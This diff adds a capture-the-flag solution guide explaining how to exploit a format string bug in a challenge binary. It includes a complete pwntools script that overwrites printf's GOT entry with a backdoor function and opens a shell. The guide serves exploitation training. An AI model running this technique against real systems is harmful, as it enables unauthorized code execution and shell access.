@@ -1,0 +1,124 @@
+To solve this challenge using pwntools, we'll exploit a format string vulnerability to overwrite the Global Offset Table (GOT) entry of `printf` with the address of the `backdoor` function. This will cause the program to call `backdoor()` when `printf()` is invoked again, giving us a shell.
+
+Here's a step-by-step guide with code:
+
+### **Step 1: Understand the Vulnerability**
+
+1. **Format String Vulnerability**: The program reads user input into `buf` and then calls `printf(buf);` without specifying a format string. This allows us to control the format string and exploit it.
+
+2. **Function Addresses**:
+   - **`printf` GOT Entry**: We can overwrite the GOT entry of `printf` to redirect execution.
+   - **`backdoor` Function**: Contains `system("/bin/sh");`, which gives us a shell.
+
+3. **Partial RELRO**: Since the binary has partial RELRO, the GOT is writable, allowing us to overwrite entries.
+
+### **Step 2: Plan the Exploit**
+
+- **Goal**: Overwrite the GOT entry of `printf` (`0x0804a010`) with the address of `backdoor` (`0x0804859B`).
+
+- **Method**: Use the `%n` format specifier in a crafted format string to write the desired address to the GOT entry.
+
+### **Step 3: Use Pwntools to Write the Exploit**
+
+Here's the code to perform the exploit:
+
+```python
+from pwn import *
+
+def main():
+    # Load the binary
+    target = './fmt'
+    elf = ELF(target)
+    p = process(target)
+
+    # Receive the initial 'gift' line (if any)
+    print(p.recvline())  # Skip the 'gift' line
+
+    # Addresses
+    printf_got = elf.got['printf']
+    backdoor = elf.symbols['backdoor']
+
+    log.info(f"printf GOT at {hex(printf_got)}")
+    log.info(f"backdoor at {hex(backdoor)}")
+
+    # Function to test the format string and find the offset
+    def send_fmt_payload(payload):
+        p.sendline(payload)
+        return p.recv()
+
+    # Find the correct offset for our format string
+    fmt = FmtStr(execute_fmt=send_fmt_payload)
+    offset = fmt.offset
+
+    log.info(f"Found format string offset: {offset}")
+
+    # Create the payload to overwrite printf GOT with backdoor address
+    writes = { printf_got: backdoor }
+    payload = fmtstr_payload(offset, writes)
+
+    log.info(f"Sending payload: {payload}")
+
+    # Send the payload
+    p.sendline(payload)
+
+    # Get an interactive shell
+    p.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+**Explanation of the Code:**
+
+1. **Import pwntools**: Provides functions to interact with binaries and perform exploits.
+
+2. **Load the ELF Binary**: Using `ELF(target)` loads the binary and extracts symbols and GOT entries.
+
+3. **Establish Process or Remote Connection**: `p = process(target)` starts the binary locally.
+
+4. **Receive Initial Output**: Skip any initial output like the 'gift' line.
+
+5. **Identify Addresses**:
+   - **`printf_got`**: The GOT entry of `printf` we intend to overwrite.
+   - **`backdoor`**: The address of the `backdoor` function.
+
+6. **Find Format String Offset**:
+   - Use `FmtStr` class from pwntools to automatically determine the correct offset for the format string parameters.
+
+7. **Create the Payload**:
+   - Use `fmtstr_payload()` with the correct offset and the addresses to create the exploit string that will perform the write.
+
+8. **Send the Payload**:
+   - Send the crafted payload to the binary.
+   - The format string will overwrite the `printf` GOT entry with the `backdoor` address.
+
+9. **Interact with the Shell**:
+   - Use `p.interactive()` to interact with the shell spawned by the `backdoor` function.
+
+### **Step 4: Run the Exploit**
+
+- Save the script as `exploit.py`.
+- Ensure that the `fmt` binary is in the same directory and is executable.
+- Run the script:
+
+```bash
+python exploit.py
+```
+
+- If successful, you should get an interactive shell.
+
+### **Notes and Tips**
+
+- **Understanding Offsets**: The `FmtStr` class automates finding the correct offset. Alternatively, you can manually determine it by sending test format strings and analyzing the output.
+
+- **Endianess and Address Size**: Since we're dealing with a 32-bit binary, addresses are 4 bytes, and endianness is little-endian.
+
+- **Format String Mechanics**:
+  - `%n` writes the number of bytes printed so far to an address.
+  - We use format string directives to control the number of bytes printed to match the address of `backdoor`.
+
+- **Logging**: The `log.info()` statements help understand what's happening at each step.
+
+### **Summary**
+
+By exploiting the format string vulnerability, we can overwrite function pointers in the GOT to redirect execution flow. Using pwntools simplifies the process of crafting the payload and automates many steps, such as finding offsets and generating the correct format string.
